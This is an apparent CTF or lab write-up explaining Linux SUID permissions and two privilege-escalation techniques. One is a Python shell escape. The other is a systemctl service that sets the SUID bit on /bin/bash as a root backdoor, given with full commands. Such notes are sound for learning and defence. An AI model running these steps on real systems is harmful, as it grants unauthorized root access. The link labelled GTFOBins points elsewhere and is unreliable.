## ðŸ” What Is SUID?

- **SUID (Set User ID)**: Special Linux permission that lets a user **execute a binary with the privileges of the file owner** â€” not their own.
- Appears as an **`s`** in the user-execute position of `ls -l`:
  ```
  -rwsr-xr-x 1 root root ... welcome
    â†‘
    SUID bit set
  ```

> ðŸ’¡ **Normal execution**: Runs as **you**  
> **SUID execution**: Runs as **file owner** (e.g., `root`)

---
## ðŸŽ¯ Why Itâ€™s Dangerous

- Designed for **legitimate use cases** (e.g., `passwd` needs root to edit `/etc/shadow`)
- But if a **SUID binary is vulnerable or misconfigured**, it becomes a **privilege escalation vector**
- **Critical conditions for exploitation**:
  1. Binary is **owned by root** (or privileged user)
  2. You have **execute permission**
  3. Binary has a **vulnerability** (buffer overflow, shell escape, etc.)

> âš ï¸ **SUID â‰  automatic root shell** â€” you must **abuse the binaryâ€™s behavior**

---
### 1. What is SUID?

Normally, when you run a program, it runs with _your_ permissions. However, if a file has the **SUID bit** set, it runs with the permissions of the **owner** of the file.

If the owner of a file is `root` and it has the SUID bit, anyone who runs that file (even `www-data`) effectively becomes `root` for as long as that program is running.

---

### 2. Finding the Vulnerable File

We need to scan the whole system for files owned by `root` that have this "S" bit. Run this command in your shell:

Bash

```
find / -user root -perm -4000 -print 2>/dev/null
```

- **`/`**: Start looking from the very top (root directory).
    
- **`-user root`**: Only show files owned by root.
    
- **`-perm -4000`**: This is the magic code for "Find SUID files."
    
- **`2>/dev/null`**: This hides all the "Permission Denied" errors so your screen stays clean.

### 3. Analyzing the Results

You will see a long list of files like `/usr/bin/passwd` or `/usr/bin/chsh`. These are normal. You are looking for something **unusual**â€”a program that usually doesn't need root powers to run.

**Look for this specific line in your output:** `/usr/bin/python` (or something similar involving Python).

---

### 4. The Exploit (GTFOBins)

If `python` has SUID permissions, we can tell Python to spawn a shell. Because the SUID bit is set, that shell will belong to `root`.

**Run this command to become Root:**

Bash

```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

- **`-p`**: This is the "privileged" flag. It tells the shell not to drop the root permissions it just inherited.

#### FOR EXEMPLE :

Since `/usr/bin/python2.7` is on your list, run this command in your terminal:

Bash

```
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

- **`-c`**: Tells Python to execute the following string of code.
    
- **`import os`**: Loads the library that talks to the Operating System.
    
- **`os.execl("/bin/sh", "sh", "-p")`**: Tells the system to replace the current Python process with a shell (`/bin/sh`).
    
- **`-p`**: **Crucial!** This tells the shell to maintain the "privileged" root permissions. Without it, the shell might realize you are a low-privilege user and drop the root access.

---
---
# Other Example :

Here is the cleaned-up, technical documentation of your Privilege Escalation (PrivEsc) attack.

---
## ðŸš© Privilege Escalation: `systemctl` SUID Abuse

You identified that `/bin/systemctl` has the **SUID bit (4000)** set. This is a critical misconfiguration. Because `systemctl` is owned by `root`, any service it starts will also run with **root-level privileges**.

### ðŸ” Why `systemctl`?

By default, standard users shouldn't be able to create or start system services. However, with the SUID bit on this binary, you can:

1. **Define** a custom malicious service.
    
2. **Execute** that service as the `root` user.
    
3. **Command** the system to change file permissions or spawn shells with elevated rights.

---
### ðŸ› ï¸ The Exploit Path: "The Service Bypass"

#### Step 1: Create the Malicious Service Unit

Since `/dev/shm` (shared memory) is usually mounted with global write permissions, we create our service file there.

> **Technical Note:** You must use `echo -e` with `\n` to ensure proper formatting, as `systemd` will fail to parse a single-line "Bad Message."


```
echo -e "[Service]\nType=oneshot\nExecStart=/bin/bash -c 'chmod +s /bin/bash'\n[Install]\nWantedBy=multi-user.target" > /dev/shm/root.service
```

- **`Type=oneshot`**: The service runs the command and exits immediately.
    
- **`chmod +s /bin/bash`**: This adds the SUID bit to the Bash binary, allowing anyone who runs it to assume the UID of the owner (root).

#### Step 2: Link and Execute

Use the SUID version of `systemctl` to load the file into the system's service path and trigger it.


```
# Link the unit file to the systemd directory
/bin/systemctl link /dev/shm/root.service

# Enable and start the service immediately
/bin/systemctl enable --now root.service
```

#### Step 3: Escalate to Root

Once the service executes, the `/bin/bash` binary is effectively "backdoored" with SUID permissions. To enter the root shell, use the **privileged flag**.


```
bash -p
```

- **`whoami`**: Should return `root`.
    
- **`cat /root/root.txt`**: Retrieve the final flag.

---
### ðŸ’¡ Pro-Tip: GTFOBins

When you find a binary with a SUID bit, don't guess the syntax. Use [GTFOBins](https://gemini.google.com/app/4e76f3d6864e85c5), which provides curated "living off the land" techniques for bypassing local security restrictions.

---
---
